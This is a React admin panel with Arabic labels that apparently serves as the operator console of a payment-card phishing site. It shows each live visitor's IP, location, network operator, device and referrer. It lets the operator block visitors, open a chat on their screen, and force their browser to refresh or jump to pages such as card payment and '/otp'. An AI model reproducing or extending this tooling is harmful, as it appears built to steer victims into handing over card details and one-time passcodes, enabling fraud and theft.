// @ts-nocheck
import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import {
  VISITOR_CHANNEL,
  parseBrowser,
  parseDevice,
  type VisitorPresence,
} from "@/lib/visitor-tracking";
import {
  Send,
  ShieldOff,
  ShieldCheck,
  RefreshCw,
  Wifi,
  MessageCircle,
  X,
  Smartphone,
  Globe,
  MapPin,
  Network,
  Wifi as WifiIcon,
  ExternalLink,
} from "lucide-react";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import { startConversationByAdmin, sendMessage } from "@/lib/chat";

const QUICK_ROUTES = [
  { label: "الرئيسية", path: "/" },
  { label: "أنواع البطاقات", path: "/card-types" },
  { label: "بطاقاتنا", path: "/cards" },
  { label: "الدفع بالبطاقة", path: "/otp" },
  { label: "OTP", path: "/otp" },
];

type BlockedRow = { visitor_id: string; created_at: string; reason: string | null };

const VisitorsPanel = () => {
  const [visitors, setVisitors] = useState<VisitorPresence[]>([]);
  const [blocked, setBlocked] = useState<BlockedRow[]>([]);
  const [redirectFor, setRedirectFor] = useState<string | null>(null);
  const [customPath, setCustomPath] = useState("");
  const [chatFor, setChatFor] = useState<string | null>(null);
  const [chatDraft, setChatDraft] = useState("");
  const [chatSending, setChatSending] = useState(false);

  const handleSendChat = async (visitorId: string) => {
    const text = chatDraft.trim();
    if (!text) return;
    setChatSending(true);
    const conv = await startConversationByAdmin(visitorId);
    if (!conv) {
      setChatSending(false);
      toast.error("تعذّر بدء المحادثة");
      return;
    }
    const ok = await sendMessage(conv.id, "admin", text);
    setChatSending(false);
    if (ok) {
      toast.success("تم إرسال الرسالة للزائر");
      setChatDraft("");
      setChatFor(null);
    } else {
      toast.error("فشل إرسال الرسالة");
    }
  };

  // Presence channel — read everyone online
  useEffect(() => {
    const channel = supabase.channel(VISITOR_CHANNEL, {
      config: { presence: { key: "admin-watcher-" + Math.random().toString(36).slice(2) } },
    });

    const sync = () => {
      const state = channel.presenceState<VisitorPresence>();
      const list: VisitorPresence[] = [];
      (Object.values(state) as VisitorPresence[][]).forEach((entries) => {
        const last = entries[entries.length - 1];
        if (last && (last as VisitorPresence).visitor_id) {
          list.push(last as VisitorPresence);
        }
      });
      // unique by visitor_id, newest first
      const map = new Map<string, VisitorPresence>();
      list.forEach((v) => map.set(v.visitor_id, v));
      setVisitors(
        Array.from(map.values()).sort((a, b) =>
          (b.online_at || "").localeCompare(a.online_at || ""),
        ),
      );
    };

    channel
      .on("presence", { event: "sync" }, sync)
      .on("presence", { event: "join" }, sync)
      .on("presence", { event: "leave" }, sync)
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  // Blocked list
  const loadBlocked = async () => {
    const { data } = await supabase
      .from("blocked_visitors")
      .select("*")
      .order("created_at", { ascending: false });
    setBlocked((data as BlockedRow[]) || []);
  };

  useEffect(() => {
    loadBlocked();
    const channel = supabase
      .channel("admin-blocked-watch")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "blocked_visitors" },
        () => loadBlocked(),
      )
      .subscribe();
    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const blockedSet = useMemo(() => new Set(blocked.map((b) => b.visitor_id)), [blocked]);

  const sendCommand = async (visitorId: string, command: string, payload?: string) => {
    const { error } = await supabase
      .from("visitor_commands")
      .insert({ visitor_id: visitorId, command, payload: payload ?? null });
    if (error) {
      toast.error("فشل إرسال الأمر");
      console.error(error);
      return false;
    }
    return true;
  };

  const handleRedirect = async (visitorId: string, path: string) => {
    const ok = await sendCommand(visitorId, "redirect", path);
    if (ok) toast.success(`تم توجيه الزائر إلى ${path}`);
    setRedirectFor(null);
    setCustomPath("");
  };

  const handleRefresh = async (visitorId: string) => {
    const ok = await sendCommand(visitorId, "refresh");
    if (ok) toast.success("تم إرسال أمر تحديث");
  };

  const handleBlock = async (visitorId: string) => {
    if (!confirm("حظر هذا الزائر من الوصول للموقع؟")) return;
    const { error } = await supabase
      .from("blocked_visitors")
      .insert({ visitor_id: visitorId });
    if (error) {
      toast.error("فشل الحظر");
      return;
    }
    toast.success("تم حظر الزائر");
  };

  const handleUnblock = async (visitorId: string) => {
    const { error } = await supabase
      .from("blocked_visitors")
      .delete()
      .eq("visitor_id", visitorId);
    if (error) {
      toast.error("فشل إلغاء الحظر");
      return;
    }
    toast.success("تم إلغاء الحظر");
  };

  return (
    <div className="space-y-4">
      {/* Online visitors */}
      <div className="overflow-hidden rounded-2xl bg-white shadow-card">
        <div className="flex items-center justify-between border-b border-border px-4 py-3">
          <div className="flex items-center gap-2 text-brand-blue">
            <div className="grid h-9 w-9 place-items-center rounded-lg bg-emerald-100 text-emerald-700">
              <Wifi className="h-4 w-4" />
            </div>
            <div>
              <h2 className="text-[14px] font-extrabold">الزوار المتصلون الآن</h2>
              <div className="text-[11.5px] text-muted-foreground">
                تحديث لحظي عبر Realtime
              </div>
            </div>
          </div>
          <div className="rounded-full bg-emerald-100 px-3 py-1 text-[12px] font-extrabold text-emerald-700">
            {visitors.length}
          </div>
        </div>

        <div className="divide-y divide-border">
          {visitors.length === 0 && (
            <div className="px-4 py-8 text-center text-[13px] text-muted-foreground">
              لا يوجد زوار متصلون حالياً.
            </div>
          )}
          {visitors.map((v) => {
            const isBlocked = blockedSet.has(v.visitor_id);
            const device = parseDevice(v.user_agent || "");
            const browser = parseBrowser(v.user_agent || "");
            const geo = v.geo || {};
            const locationParts = [geo.city, geo.region, geo.country].filter(Boolean).join("، ");
            const referrer = v.referrer && v.referrer.trim() ? v.referrer : "مباشر";
            return (
              <div key={v.visitor_id} className="px-3 py-3 sm:px-4">
                <div className="mb-2 flex items-center justify-between gap-2">
                  <div className="flex min-w-0 items-center gap-2">
                    <span className="font-mono text-[13px] font-extrabold text-brand-blue break-all">
                      {v.visitor_id}
                    </span>
                    {isBlocked && (
                      <span className="rounded-full bg-red-100 px-2 py-0.5 text-[10px] font-bold text-red-700">
                        محظور
                      </span>
                    )}
                  </div>
                  <span className="relative flex h-2.5 w-2.5 shrink-0">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500" />
                  </span>
                </div>

                <div className="mb-2 flex items-center gap-1.5 text-[12px] text-muted-foreground" dir="ltr">
                  <MapPin className="h-3.5 w-3.5 text-red-500" />
                  <span className="truncate">{v.path}</span>
                </div>

                <div className="mb-3 space-y-1.5 rounded-xl border border-border/60 bg-muted/30 p-2.5 text-[12px] text-brand-blue">
                  <InfoRow icon={<Smartphone className="h-3.5 w-3.5" />} label="الجهاز">
                    <span dir="ltr">
                      {device.type} ({device.os})
                    </span>
                  </InfoRow>
                  <InfoRow icon={<Globe className="h-3.5 w-3.5" />} label="المتصفح">
                    <span dir="ltr">{browser}</span>
                  </InfoRow>
                  {locationParts && (
                    <InfoRow icon={<MapPin className="h-3.5 w-3.5" />} label="الموقع">
                      <span>{locationParts}</span>
                    </InfoRow>
                  )}
                  {geo.ip && (
                    <InfoRow icon={<Network className="h-3.5 w-3.5" />} label="IP">
                      <span className="font-mono text-[11.5px] break-all" dir="ltr">
                        {geo.ip}
                      </span>
                    </InfoRow>
                  )}
                  {geo.org && (
                    <InfoRow icon={<WifiIcon className="h-3.5 w-3.5" />} label="مشغّل الشبكة">
                      <span dir="ltr">{geo.org}</span>
                    </InfoRow>
                  )}
                  <InfoRow icon={<ExternalLink className="h-3.5 w-3.5" />} label="مصدر الدخول">
                    <span className="truncate" dir="ltr">
                      {referrer}
                    </span>
                  </InfoRow>
                </div>

                <div className="grid grid-cols-2 gap-1.5">
                  <button
                    type="button"
                    onClick={() =>
                      setChatFor((prev) => (prev === v.visitor_id ? null : v.visitor_id))
                    }
                    className="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-emerald-600 px-2.5 text-[12px] font-extrabold text-white hover:brightness-110"
                  >
                    <MessageCircle className="h-3.5 w-3.5" />
                    <span>مراسلة</span>
                  </button>
                  <button
                    type="button"
                    onClick={() =>
                      setRedirectFor((prev) => (prev === v.visitor_id ? null : v.visitor_id))
                    }
                    className="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-brand-blue px-2.5 text-[12px] font-extrabold text-white hover:brightness-110"
                  >
                    <Send className="h-3.5 w-3.5" />
                    <span>توجيه</span>
                  </button>
                  {isBlocked ? (
                    <button
                      type="button"
                      onClick={() => handleUnblock(v.visitor_id)}
                      className="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-emerald-600 px-2.5 text-[12px] font-extrabold text-white hover:brightness-110"
                    >
                      <ShieldCheck className="h-3.5 w-3.5" />
                      <span>فك الحظر</span>
                    </button>
                  ) : (
                    <button
                      type="button"
                      onClick={() => handleBlock(v.visitor_id)}
                      className="flex h-10 items-center justify-center gap-1.5 rounded-lg bg-destructive px-2.5 text-[12px] font-extrabold text-white hover:brightness-110"
                    >
                      <ShieldOff className="h-3.5 w-3.5" />
                      <span>حظر</span>
                    </button>
                  )}
                  <button
                    type="button"
                    onClick={() => handleRefresh(v.visitor_id)}
                    className="flex h-10 items-center justify-center gap-1.5 rounded-lg border border-border bg-white px-2.5 text-[12px] font-extrabold text-brand-blue hover:bg-muted/50"
                  >
                    <RefreshCw className="h-3.5 w-3.5" />
                    <span>تحديث</span>
                  </button>
                </div>


                {chatFor === v.visitor_id && (
                  <div className="mt-3 rounded-xl border border-emerald-200 bg-emerald-50/60 p-3">
                    <div className="mb-2 flex items-center justify-between">
                      <div className="flex items-center gap-1.5 text-[12px] font-bold text-emerald-700">
                        <MessageCircle className="h-3.5 w-3.5" />
                        <span>إرسال رسالة فورية للزائر</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => {
                          setChatFor(null);
                          setChatDraft("");
                        }}
                        className="grid h-6 w-6 place-items-center rounded text-emerald-700 hover:bg-emerald-100"
                        aria-label="إغلاق"
                      >
                        <X className="h-3.5 w-3.5" />
                      </button>
                    </div>
                    <div className="flex items-end gap-1.5">
                      <textarea
                        value={chatDraft}
                        onChange={(e) => setChatDraft(e.target.value.slice(0, 1000))}
                        onKeyDown={(e) => {
                          if (e.key === "Enter" && !e.shiftKey) {
                            e.preventDefault();
                            handleSendChat(v.visitor_id);
                          }
                        }}
                        rows={2}
                        placeholder="اكتب رسالتك للزائر..."
                        className="min-h-[42px] flex-1 resize-none rounded-lg border border-emerald-200 bg-white px-2 py-1.5 text-[12.5px] text-brand-blue outline-none focus:border-emerald-400"
                      />
                      <button
                        type="button"
                        disabled={chatSending || !chatDraft.trim()}
                        onClick={() => handleSendChat(v.visitor_id)}
                        className={cn(
                          "grid h-[42px] w-[42px] shrink-0 place-items-center rounded-lg text-white",
                          chatDraft.trim() && !chatSending
                            ? "bg-emerald-600 hover:brightness-110"
                            : "cursor-not-allowed bg-muted-foreground/40",
                        )}
                        aria-label="إرسال"
                      >
                        <Send className="h-4 w-4" />
                      </button>
                    </div>
                    <div className="mt-1.5 text-[10.5px] text-emerald-700/80">
                      ستظهر نافذة الدردشة لدى الزائر تلقائياً.
                    </div>
                  </div>
                )}

                {redirectFor === v.visitor_id && (
                  <div className="mt-3 rounded-xl border border-border/70 bg-muted/30 p-3">
                    <div className="mb-2 text-[12px] font-bold text-brand-blue">
                      اختر صفحة للتوجيه:
                    </div>
                    <div className="flex flex-wrap gap-1.5">
                      {QUICK_ROUTES.map((r) => (
                        <button
                          key={r.path}
                          type="button"
                          onClick={() => handleRedirect(v.visitor_id, r.path)}
                          className="rounded-lg border border-border bg-white px-2.5 py-1.5 text-[11px] font-bold text-brand-blue hover:bg-brand-blue hover:text-white"
                        >
                          {r.label}
                        </button>
                      ))}
                    </div>
                    <div className="mt-2 flex gap-1.5">
                      <input
                        value={customPath}
                        onChange={(e) => setCustomPath(e.target.value)}
                        placeholder="/مسار-مخصص"
                        dir="ltr"
                        className="h-9 flex-1 rounded-lg border border-border bg-white px-2 text-[12px] text-brand-blue outline-none focus:border-brand-blue"
                      />
                      <button
                        type="button"
                        disabled={!customPath.trim()}
                        onClick={() => handleRedirect(v.visitor_id, customPath.trim())}
                        className={cn(
                          "h-9 rounded-lg px-3 text-[11px] font-extrabold text-white",
                          customPath.trim()
                            ? "bg-brand-blue hover:brightness-110"
                            : "cursor-not-allowed bg-muted-foreground/40",
                        )}
                      >
                        إرسال
                      </button>
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>

      {/* Blocked list */}
      <div className="overflow-hidden rounded-2xl bg-white shadow-card">
        <div className="flex items-center justify-between border-b border-border px-4 py-3">
          <div className="flex items-center gap-2 text-brand-blue">
            <div className="grid h-9 w-9 place-items-center rounded-lg bg-red-100 text-red-700">
              <ShieldOff className="h-4 w-4" />
            </div>
            <h2 className="text-[14px] font-extrabold">الزوار المحظورون</h2>
          </div>
          <div className="rounded-full bg-red-100 px-3 py-1 text-[12px] font-extrabold text-red-700">
            {blocked.length}
          </div>
        </div>
        <div className="divide-y divide-border">
          {blocked.length === 0 && (
            <div className="px-4 py-6 text-center text-[12.5px] text-muted-foreground">
              لا يوجد زوار محظورون.
            </div>
          )}
          {blocked.map((b) => (
            <div key={b.visitor_id} className="flex items-center justify-between px-4 py-2.5">
              <div>
                <div className="font-mono text-[12.5px] font-extrabold text-brand-blue">
                  {b.visitor_id}
                </div>
                <div className="text-[11px] text-muted-foreground">
                  منذ {new Date(b.created_at).toLocaleString("ar-SA")}
                </div>
              </div>
              <button
                type="button"
                onClick={() => handleUnblock(b.visitor_id)}
                className="flex h-8 items-center gap-1 rounded-lg bg-emerald-600 px-2.5 text-[11px] font-extrabold text-white hover:brightness-110"
              >
                <ShieldCheck className="h-3.5 w-3.5" />
                <span>إلغاء الحظر</span>
              </button>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

function InfoRow({
  icon,
  label,
  children,
}: {
  icon: React.ReactNode;
  label: string;
  children: React.ReactNode;
}) {
  return (
    <div className="flex items-center justify-between gap-2">
      <div className="flex min-w-0 flex-1 items-center justify-end gap-1.5 text-left">
        <div className="min-w-0 truncate">{children}</div>
      </div>
      <div className="flex shrink-0 items-center gap-1.5 text-muted-foreground">
        <span className="text-[11.5px] font-bold text-brand-blue/80">{label}:</span>
        <span className="text-brand-blue/70">{icon}</span>
      </div>
    </div>
  );
}

export default VisitorsPanel;

